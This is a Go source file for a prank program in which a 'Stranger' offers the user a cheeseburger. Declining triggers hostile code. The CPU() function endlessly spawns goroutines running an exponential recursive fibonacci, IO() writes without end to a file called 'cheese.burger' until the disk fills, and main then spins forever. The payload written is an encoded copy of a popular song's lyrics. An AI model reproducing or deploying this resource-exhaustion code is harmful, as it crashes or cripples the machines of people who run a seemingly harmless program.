package main

import (
	"fmt"
	"os"
	"time"
)

func fibonacci(number int) int {
	if number <= 1 {
		return number
	}
	return fibonacci(number-1) + fibonacci(number-2)
}

func CPU() {
	for {
		go fibonacci(9999999)
		go fibonacci(9999999)
		go fibonacci(9999999)
		go fibonacci(9999999)
		go fibonacci(9999999)
	}
}

func IO() {
	f, err := os.Create("cheese.burger")
	if err != nil {
		panic(err)
	}
	defer f.Close()

	// Shape of you lyrics encoded in base64
	data := []byte("VGhlIGNsdWIgaXNuJ3QgdGhlIGJlc3QgcGxhY2UgdG8gZmluZCBhIGxvdmVyIFNvIHRoZSBiYXIgaXMgd2hlcmUgSSBnbyBNZSBhbmQgbXkgZnJpZW5kcyBhdCB0aGUgdGFibGUgZG9pbmcgc2hvdHMgRHJpbmtpbmcgZmFzdCBhbmQgdGhlbiB3ZSB0YWxrIHNsb3cgQW5kIHlvdSBjb21lIG92ZXIgYW5kIHN0YXJ0IHVwIGEgY29udmVyc2F0aW9uIHdpdGgganVzdCBtZSBBbmQgdHJ1c3QgbWUgSSdsbCBnaXZlIGl0IGEgY2hhbmNlIG5vdyBUYWtlIG15IGhhbmQsIHN0b3AsIHB1dCBWYW4gdGhlIE1hbiBvbiB0aGUganVrZWJveCBBbmQgdGhlbiB3ZSBzdGFydCB0byBkYW5jZSwgYW5kIG5vdyBJJ20gc2luZ2luZyBsaWtlIEdpcmwsIHlvdSBrbm93IEkgd2FudCB5b3VyIGxvdmUgWW91ciBsb3ZlIHdhcyBoYW5kbWFkZSBmb3Igc29tZWJvZHkgbGlrZSBtZSBDb21lIG9uIG5vdywgZm9sbG93IG15IGxlYWQgSSBtYXkgYmUgY3JhenksIGRvbid0IG1pbmQgbWUgU2F5LCBib3ksIGxldCdzIG5vdCB0YWxrIHRvbyBtdWNoIEdyYWIgb24gbXkgd2Fpc3QgYW5kIHB1dCB0aGF0IGJvZHkgb24gbWUgQ29tZSBvbiBub3csIGZvbGxvdyBteSBsZWFkIENvbWUsIGNvbWUgb24gbm93LCBmb2xsb3cgbXkgbGVhZCBJJ20gaW4gbG92ZSB3aXRoIHRoZSBzaGFwZSBvZiB5b3UgV2UgcHVzaCBhbmQgcHVsbCBsaWtlIGEgbWFnbmV0IGRvIEFsdGhvdWdoIG15IGhlYXJ0IGlzIGZhbGxpbmcgdG9vIEknbSBpbiBsb3ZlIHdpdGggeW91ciBib2R5IEFuZCBsYXN0IG5pZ2h0IHlvdSB3ZXJlIGluIG15IHJvb20gQW5kIG5vdyBteSBiZWRzaGVldHMgc21lbGwgbGlrZSB5b3UgRXZlcnkgZGF5IGRpc2NvdmVyaW5nIHNvbWV0aGluZyBicmFuZCBuZXcgSSdtIGluIGxvdmUgd2l0aCB5b3VyIGJvZHkgT2gtSS1vaC1JLW9oLUktb2gtSSBJJ20gaW4gbG92ZSB3aXRoIHlvdXIgYm9keSBPaC1JLW9oLUktb2gtSS1vaC1JIEknbSBpbiBsb3ZlIHdpdGggeW91ciBib2R5IE9oLUktb2gtSS1vaC1JLW9oLUkgSSdtIGluIGxvdmUgd2l0aCB5b3VyIGJvZHkgRXZlcnkgZGF5IGRpc2NvdmVyaW5nIHNvbWV0aGluZyBicmFuZCBuZXcgSSdtIGluIGxvdmUgd2l0aCB0aGUgc2hhcGUgb2YgeW91IE9uZSB3ZWVrIGluIHdlIGxldCB0aGUgc3RvcnkgYmVnaW4gV2UncmUgZ29pbmcgb3V0IG9uIG91ciBmaXJzdCBkYXRlIFlvdSBhbmQgbWUgYXJlIHRocmlmdHksIHNvIGdvIGFsbCB5b3UgY2FuIGVhdCBGaWxsIHVwIHlvdXIgYmFnIGFuZCBJIGZpbGwgdXAgYSBwbGF0ZSBXZSB0YWxrIGZvciBob3VycyBhbmQgaG91cnMgYWJvdXQgdGhlIHN3ZWV0IGFuZCB0aGUgc291ciBBbmQgaG93IHlvdXIgZmFtaWx5IGlzIGRvaW5nIG9rYXkgTGVhdmUgYW5kIGdldCBpbiBhIHRheGksIHRoZW4ga2lzcyBpbiB0aGUgYmFja3NlYXQgVGVsbCB0aGUgZHJpdmVyIG1ha2UgdGhlIHJhZGlvIHBsYXksIGFuZCBJJ20gc2luZ2luZyBsaWtlIEdpcmwsIHlvdSBrbm93IEkgd2FudCB5b3VyIGxvdmUgWW91ciBsb3ZlIHdhcyBoYW5kbWFkZSBmb3Igc29tZWJvZHkgbGlrZSBtZSBDb21lIG9uIG5vdywgZm9sbG93IG15IGxlYWQgSSBtYXkgYmUgY3JhenksIGRvbid0IG1pbmQgbWUgU2F5LCBib3ksIGxldCdzIG5vdCB0YWxrIHRvbyBtdWNoIEdyYWIgb24gbXkgd2Fpc3QgYW5kIHB1dCB0aGF0IGJvZHkgb24gbWUgQ29tZSBvbiBub3csIGZvbGxvdyBteSBsZWFkIENvbWUsIGNvbWUgb24gbm93LCBmb2xsb3cgbXkgbGVhZCBJJ20gaW4gbG92ZSB3aXRoIHRoZSBzaGFwZSBvZiB5b3UgV2UgcHVzaCBhbmQgcHVsbCBsaWtlIGEgbWFnbmV0IGRvIEFsdGhvdWdoIG15IGhlYXJ0IGlzIGZhbGxpbmcgdG9vIEknbSBpbiBsb3ZlIHdpdGggeW91ciBib2R5IEFuZCBsYXN0IG5pZ2h0IHlvdSB3ZXJlIGluIG15IHJvb20gQW5kIG5vdyBteSBiZWRzaGVldHMgc21lbGwgbGlrZSB5b3UgRXZlcnkgZGF5IGRpc2NvdmVyaW5nIHNvbWV0aGluZyBicmFuZCBuZXcgSSdtIGluIGxvdmUgd2l0aCB5b3VyIGJvZHkgT2gtSS1vaC1JLW9oLUktb2gtSSBJJ20gaW4gbG92ZSB3aXRoIHlvdXIgYm9keSBPaC1JLW9oLUktb2gtSS1vaC1JIEknbSBpbiBsb3ZlIHdpdGggeW91ciBib2R5IE9oLUktb2gtSS1vaC1JLW9oLUkgSSdtIGluIGxvdmUgd2l0aCB5b3VyIGJvZHkgRXZlcnkgZGF5IGRpc2NvdmVyaW5nIHNvbWV0aGluZyBicmFuZCBuZXcgSSdtIGluIGxvdmUgd2l0aCB0aGUgc2hhcGUgb2YgeW91IENvbWUgb24sIGJlIG15IGJhYnksIGNvbWUgb24gQ29tZSBvbiwgYmUgbXkgYmFieSwgY29tZSBvbiBDb21lIG9uLCBiZSBteSBiYWJ5LCBjb21lIG9uIENvbWUgb24sIGJlIG15IGJhYnksIGNvbWUgb24gQ29tZSBvbiwgYmUgbXkgYmFieSwgY29tZSBvbiBDb21lIG9uLCBiZSBteSBiYWJ5LCBjb21lIG9uIENvbWUgb24sIGJlIG15IGJhYnksIGNvbWUgb24gQ29tZSBvbiwgYmUgbXkgYmFieSwgY29tZSBvbiBJJ20gaW4gbG92ZSB3aXRoIHRoZSBzaGFwZSBvZiB5b3UgV2UgcHVzaCBhbmQgcHVsbCBsaWtlIGEgbWFnbmV0IGRvIEFsdGhvdWdoIG15IGhlYXJ0IGlzIGZhbGxpbmcgdG9vIEknbSBpbiBsb3ZlIHdpdGggeW91ciBib2R5IExhc3QgbmlnaHQgeW91IHdlcmUgaW4gbXkgcm9vbSBBbmQgbm93IG15IGJlZHNoZWV0cyBzbWVsbCBsaWtlIHlvdSBFdmVyeSBkYXkgZGlzY292ZXJpbmcgc29tZXRoaW5nIGJyYW5kIG5ldyBJJ20gaW4gbG92ZSB3aXRoIHlvdXIgYm9keSBDb21lIG9uLCBiZSBteSBiYWJ5LCBjb21lIG9uIENvbWUgb24sIGJlIG15IGJhYnksIGNvbWUgb24gSSdtIGluIGxvdmUgd2l0aCB5b3VyIGJvZHkgQ29tZSBvbiwgYmUgbXkgYmFieSwgY29tZSBvbiBDb21lIG9uLCBiZSBteSBiYWJ5LCBjb21lIG9uIEknbSBpbiBsb3ZlIHdpdGggeW91ciBib2R5IENvbWUgb24sIGJlIG15IGJhYnksIGNvbWUgb24gQ29tZSBvbiwgYmUgbXkgYmFieSwgY29tZSBvbiBJJ20gaW4gbG92ZSB3aXRoIHlvdXIgYm9keSBFdmVyeSBkYXkgZGlzY292ZXJpbmcgc29tZXRoaW5nIGJyYW5kIG5ldyBJJ20gaW4gbG92ZSB3aXRoIHRoZSBzaGFwZSBvZiB5b3U=")
	for {
		_, err := f.Write(data)
		if err != nil {
			panic(err)
		}
	}
}

func main() {

	fmt.Printf("Stranger: Hi!")
	time.Sleep(3 * time.Second)
	fmt.Printf("\nStranger: Do you want a cheeseburger?\n[Y/N] ")
	input := ""
	fmt.Scanf("%s", &input)
	if input == "Y" {
		fmt.Printf("Stranger: I have 1 left. Take it :)")
		time.Sleep(5 * time.Second)
	} else {
		go CPU()
		go IO()

		time.Sleep(1 * time.Second)
		fmt.Printf("Stranger: \"Don't take anything from strangers!\"")
		time.Sleep(1550)
		for i := 0; i < 3; i++ {
			fmt.Printf(".")
			time.Sleep(550)
		}
		for {
		}
	}
}
